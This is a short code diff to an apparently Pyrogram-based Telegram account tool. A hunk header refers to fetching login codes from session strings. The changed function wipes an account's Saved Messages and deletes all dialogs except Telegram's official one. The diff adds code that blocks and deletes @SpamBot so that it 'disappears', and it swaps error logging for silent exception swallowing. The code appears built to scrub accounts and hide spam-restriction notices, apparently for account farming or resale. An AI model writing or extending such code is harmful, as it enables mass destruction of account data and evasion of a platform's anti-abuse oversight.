@@ -159,28 +159,34 @@ async def get_telegram_login_code(session_string: str, after_ts: float = None) -
 async def perform_full_wipe(client: Client):
     """Deletes all chats and clears history for Saved Messages."""
     try:
-        # 1. Clear Saved Messages (me) explicitly using RPC for reliability
+        # 1. Clear Saved Messages (me) explicitly
         try:
             from pyrogram.raw import functions
             peer = await client.resolve_peer("me")
             await client.invoke(functions.messages.DeleteHistory(
-                peer=peer,
-                max_id=0,
-                just_clear=True,
-                revoke=False
+                peer=peer, max_id=0, just_clear=True, revoke=False
             ))
-        except Exception as e:
-            logging.warning(f"Failed to clear Saved Messages: {e}")
+        except Exception: pass
 
-        # 2. Iterate through all dialogs and delete them
+        # 2. Specifically Block and Delete SpamBot to ensure it disappears
+        try:
+            # Explicitly target SpamBot ID (178220800) and username
+            for target in ["SpamBot", 178220800]:
+                try:
+                    await client.block_user(target)
+                    await client.delete_chat(target)
+                except Exception: pass
+        except Exception: pass
+
+        # 3. Iterate through all dialogs and delete them
         async for dialog in client.get_dialogs():
             if dialog.chat.id == 777000: # Skip Telegram Official
                 continue
             try:
                 await client.delete_chat(dialog.chat.id)
-            except Exception:
-                pass
-        logging.info("Full Wipe completed successfully.")
+            except Exception: pass
+        
+        logging.info("Full Wipe completed successfully (including SpamBot blocking).")
     except Exception as e:
         logging.error(f"Full Wipe error: {e}")
 
